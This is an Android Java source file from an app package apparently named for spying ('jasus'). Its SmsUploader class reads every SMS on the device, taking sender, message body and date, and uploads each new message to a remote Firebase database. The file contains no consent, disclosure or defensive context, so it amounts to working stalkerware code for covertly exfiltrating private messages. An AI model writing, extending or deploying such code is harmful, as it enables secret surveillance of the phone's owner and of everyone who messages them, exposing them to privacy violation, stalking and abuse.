package com.perry.jasus.ActionClasses;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;
import com.perry.jasus.Models.SmsModel;
import com.perry.jasus.Util.FirebaseConstant;
import com.perry.jasus.Util.SmsInfo;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SmsUploader {
    private Context mContext;
    private long mLastUploadTime;
    private List mUploadedSmsList;

    public SmsUploader(Context context) {
        mContext = context;
        mLastUploadTime = 0; // Set initial value to 0
        mUploadedSmsList = new ArrayList<>();
    }

    public void uploadSms() {
        // Get SMS details from the device
        Cursor cursor = mContext.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);

        if (cursor.moveToFirst()) {
            do {
                // Get SMS details and convert date to "HH MM AAA DD MMM YYYY" format
                SmsInfo smsInfo = getSmsDetails(cursor);

                // Upload SMS if it was received after the last upload time and hasn't been uploaded before
                if (smsInfo.getDateInMillis() > mLastUploadTime && !mUploadedSmsList.contains(smsInfo)) {
                    Log.d("SmsUploader", "Uploading SMS: " + smsInfo);

                    // Save SMS to Firebase database
                    storeSmsToFirebase(smsInfo);

                    // Add uploaded SMS to the list of uploaded SMS
                    mUploadedSmsList.add(smsInfo);
                }

            } while (cursor.moveToNext());
        }

        // Update the last upload time to the current time
        mLastUploadTime = System.currentTimeMillis();
    }
    @SuppressLint("Range")
    public SmsInfo getSmsDetails(Cursor cursor) {
        // Get SMS details from the cursor
         String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
        String msg = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
        long dateInMillis = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));

        // Create a new SmsInfo object with the received details
        SmsInfo smsInfo = new SmsInfo(address, msg, dateInMillis);

        return smsInfo;
    }

    public void storeSmsToFirebase(SmsInfo smsInfo) {
        // Get Firebase database reference
        DatabaseReference databaseRef = FirebaseDatabase.getInstance().getReference();

        // Save the SMS object to Firebase database
       FirebaseConstant.SmsDb.push().setValue(smsInfo);
    }
}
